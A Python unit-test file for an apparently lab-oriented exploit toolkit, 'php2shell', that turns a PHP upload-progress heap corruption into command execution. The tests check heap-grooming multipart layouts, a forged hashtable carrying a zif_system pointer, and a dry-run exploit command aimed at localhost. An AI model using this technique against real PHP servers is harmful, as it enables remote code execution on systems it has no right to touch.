#!/usr/bin/env python3
"""Unit tests for the vessel stage-3 variant (tools/php2shell_vessel.py)."""

from __future__ import annotations

import argparse
import struct
import sys
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))

import php2shell_auto as auto  # noqa: E402
import php2shell_vessel as ves  # noqa: E402


class FakeTarget:
    """Records posts so fire() can be verified without a server."""

    def __init__(self):
        self.posts = []          # (body, boundary, extra_headers)
        self.timeout = 30.0

    def log(self, msg):
        pass

    def post(self, body, boundary, read_cap=None, timeout=None,
             extra_headers=None):
        self.posts.append((body, boundary, extra_headers))

    def get(self, path):
        return 404, b""


class FakeMod:
    """Records build_multipart calls; the body itself is opaque."""

    SID = b"S" * 32

    def __init__(self):
        self.calls = []          # (parts, boundary)

    def build_multipart(self, parts, boundary):
        self.calls.append((parts, boundary))
        return b"BODY"


class FakeExploit:
    """Just enough of upstream Exploit for the vessel helpers."""

    def __init__(self, target, payload):
        self.t = target
        self._payload = payload

    def _fake_payload(self, htdata, zif):
        return bytearray(self._payload), None

    def _file_part(self):
        return {"name": "file", "data": b"F"}

    def _big_field(self):
        return {"name": "big", "data": b"B"}


def make_pair(payload=None):
    payload = payload if payload is not None else bytes(range(167))
    mod, target = FakeMod(), FakeTarget()
    return mod, FakeExploit(target, payload), target


class PadSpecTests(unittest.TestCase):
    def test_parse_pads_groups(self):
        self.assertEqual(ves.parse_pads("7:7x3"), [(7, 7)] * 3)
        self.assertEqual(ves.parse_pads("31:31x6,7:7x3"),
                         [(31, 31)] * 6 + [(7, 7)] * 3)
        self.assertEqual(ves.parse_pads("5:9x1"), [(5, 9)])

    def test_parse_pads_none(self):
        for spec in ("none", "", "0x0"):
            self.assertEqual(ves.parse_pads(spec), [])

    def test_parse_pads_rejects_bad_spec(self):
        with self.assertRaises(argparse.ArgumentTypeError):
            ves.parse_pads("7:7")          # missing repeat count
        with self.assertRaises(argparse.ArgumentTypeError):
            ves.parse_pads("junk")

    def test_round_trip(self):
        for spec in ("7:7x3", "31:31x6,7:7x3", "5:9x1,7:7x2"):
            self.assertEqual(ves.pads_to_spec(ves.parse_pads(spec)), spec)

    def test_pads_to_spec_groups_consecutive(self):
        self.assertEqual(ves.pads_to_spec([[7, 7], (7, 7), (31, 5)]),
                         "7:7x2,31:5x1")


class CarrierPatternTests(unittest.TestCase):
    def test_pattern_bytes(self):
        htdata = 0x7F00000690D8
        self.assertEqual(
            ves.carrier_pattern(htdata),
            struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7])
        self.assertEqual(len(ves.carrier_pattern(htdata)), 15)


class PrimePartsTests(unittest.TestCase):
    def test_shape_with_early_field(self):
        mod, ex, _ = make_pair()
        parts = ves.prime_parts(mod, ex, 160, [(7, 7)] * 3)
        self.assertEqual(parts[0], {"name": "PHPSESSID", "data": b"a" * 19})
        self.assertEqual(parts[1], {"name": "e0000000", "data": b"E" * 160})
        self.assertEqual(parts[2],
                         {"name": "PHP_SESSION_UPLOAD_PROGRESS",
                          "data": b"p" * 3})
        for i, part in enumerate(parts[3:6]):
            self.assertEqual(part["name"], f"p{i:06d}")
            self.assertEqual(part["data"], b"V" * 7)
        self.assertEqual(parts[6:], [ex._file_part(), ex._big_field()])

    def test_no_early_field(self):
        mod, ex, _ = make_pair()
        parts = ves.prime_parts(mod, ex, 0, [(7, 7)] * 3)
        self.assertEqual(parts[0]["name"], "PHPSESSID")
        self.assertEqual(parts[1]["name"], "PHP_SESSION_UPLOAD_PROGRESS")
        self.assertNotIn("e0000000", [p["name"] for p in parts])


class B2PartsTests(unittest.TestCase):
    def test_shape_and_vessel_graft(self):
        htdata, zif = 0x7F00000690D8, 0x7F100056A420
        mod, ex, _ = make_pair()
        parts = ves.b2_parts(mod, ex, htdata, zif, blobs=15, vessel_index=1)
        self.assertEqual(len(parts), 2 + 15)
        self.assertEqual(parts[0], {"name": "PHPSESSID", "data": mod.SID})
        self.assertEqual(parts[1],
                         {"name": "PHP_SESSION_UPLOAD_PROGRESS",
                          "data": b"pwnpwnpwn"})
        ht, _ = ex._fake_payload(htdata, zif)
        vessel = bytearray(ht)
        vessel[0x88:0x97] = ves.carrier_pattern(htdata)
        vessel[0x97] = 0
        vessel[0x98:0x9C] = struct.pack("<I", 0x0307)
        for i, part in enumerate(parts[2:]):
            # 31-char zero-padded names: every B2 field >= 8 bytes, so B2
            # never carves a bin-3 slot before the blobs.
            self.assertEqual(len(part["name"]), 31)
            self.assertTrue(part["name"].startswith("a"))
            want = bytes(vessel) if i == 1 else ht
            self.assertEqual(part["data"], want)

    def test_vessel_only_differs_at_graft(self):
        ht_data, zif = 0x7F00000690D8, 0x7F100056A420
        mod, ex, _ = make_pair()
        parts = ves.b2_parts(mod, ex, ht_data, zif, blobs=4, vessel_index=2)
        plain, vessel = parts[2]["data"], parts[4]["data"]
        self.assertEqual(len(plain), len(vessel))
        diff = [i for i in range(len(plain)) if plain[i] != vessel[i]]
        self.assertTrue(set(diff).issubset(set(range(0x88, 0x9C))))


class FireTests(unittest.TestCase):
    def test_fire_sends_prime_then_b2(self):
        mod, ex, target = make_pair()
        chunk, zif = 0x7F0000000000, 0x7F100056A420
        with mock.patch("time.sleep"):
            ves.fire(mod, ex, chunk, zif, ves.DEFAULT_HTDATA,
                     {"early": 160, "pads": [(7, 7)] * 3,
                      "blobs": 15, "vessel_index": 1})
        self.assertEqual(len(target.posts), 2)
        self.assertEqual(len(mod.calls), 2)

        prime_parts, prime_boundary = mod.calls[0]
        self.assertEqual(prime_boundary, b"S" * 17)
        self.assertEqual(prime_parts,
                         ves.prime_parts(mod, ex, 160, [(7, 7)] * 3))
        self.assertEqual(target.posts[0][2],
                         {"Cookie": "PHPSESSID=" + "a" * 32})

        b2_parts, b2_boundary = mod.calls[1]
        self.assertEqual(b2_boundary, b"B" * 10)
        self.assertEqual(
            b2_parts,
            ves.b2_parts(mod, ex, chunk + ves.DEFAULT_HTDATA, zif, 15, 1))
        # B2 carries no cookie: no PHP session must be created for it.
        self.assertIsNone(target.posts[1][2])

    def test_fire_defaults(self):
        mod, ex, target = make_pair()
        with mock.patch("time.sleep"):
            ves.fire(mod, ex, 0x7F0000000000, 0x7F100056A420,
                     ves.DEFAULT_HTDATA)
        prime_parts, _ = mod.calls[0]
        # DEFAULTS: early=160, pads 7:7x3 -> the e-field is present.
        self.assertEqual(prime_parts[1],
                         {"name": "e0000000", "data": b"E" * 160})


class CalibratorOptionsTests(unittest.TestCase):
    def test_pad_option_is_used(self):
        import php2shell_calibrate as cal

        params = cal.vessel_params({"pad": [(5, 9)], "stage3_early": 128,
                                    "stage3_blobs": 7,
                                    "stage3_vessel_index": 2})
        self.assertEqual(params["pads"], [(5, 9)])
        self.assertEqual(params["early"], 128)
        self.assertEqual(params["blobs"], 7)
        self.assertEqual(params["vessel_index"], 2)

    def test_defaults_when_only_legacy_key_is_present(self):
        import php2shell_calibrate as cal

        params = cal.vessel_params({"stage3_vessel_pads": [(6, 6)]})
        self.assertEqual(params["pads"], [(6, 6)])
        self.assertEqual(params["early"], ves.DEFAULTS["early"])


class RunVesselTests(unittest.TestCase):
    def test_dry_run_command(self):
        profile = {
            "libphp": {"zif_system": "0x56A420",
                       "zval_ptr_dtor": "0x781FE0",
                       "htdata": "0x690d8"},
            "stages": {"stage1_n": 841, "stage1_forge_len": 63,
                       "stage2_t": 406, "stage2_v": 16,
                       "stage3_mode": "vessel",
                       "stage3_pads": [[7, 7]] * 3,
                       "stage3_early": 160, "stage3_blobs": 15,
                       "stage3_vessel_index": 1},
        }
        args = SimpleNamespace(
            target="http://127.0.0.1:8160/index.php", command="id>/out/p1",
            fetch="", retries=3, no_pre_rotate=False, no_retry_rotate=False,
            allow_remote=False, insecure=False, dry_run=True,
            repo_dir="/tmp/custom-upstream")
        ui = SimpleNamespace(commands=[], command=lambda cmd:
                             ui.commands.append(cmd))
        rc = auto.run_vessel(args, profile, "/tmp/p1", 12, ui)
        self.assertEqual(rc, 0)
        cmd = ui.commands[0]
        self.assertEqual(cmd[:4],
                         [sys.executable,
                          str(ROOT / "tools" / "php2shell_vessel.py"),
                          "-u", "http://127.0.0.1:8160/index.php"])
        for flag, value in (("--zif-offset", "0x56A420"),
                            ("--dtor-offset", "0x781FE0"),
                            ("--htdata-offset", "0x690d8"),
                            ("--stage1-n", "841"), ("--forge-len", "63"),
                            ("--stage2-t", "406"), ("--stage2-v", "16"),
                            ("--early", "160"), ("--blobs", "15"),
                            ("--vessel-index", "1"), ("--pad", "7:7x3"),
                            ("--repo-dir", "/tmp/custom-upstream"),
                            ("--proof-file", "/tmp/p1"),
                            ("--huge-mb", "12"), ("--retries", "3")):
            self.assertIn([flag, value],
                          [cmd[i:i + 2] for i in range(len(cmd) - 1)], flag)
        self.assertNotIn("--fetch", cmd)
        self.assertNotIn("--allow-remote", cmd)
        self.assertNotIn("--insecure", cmd)


if __name__ == "__main__":
    unittest.main()
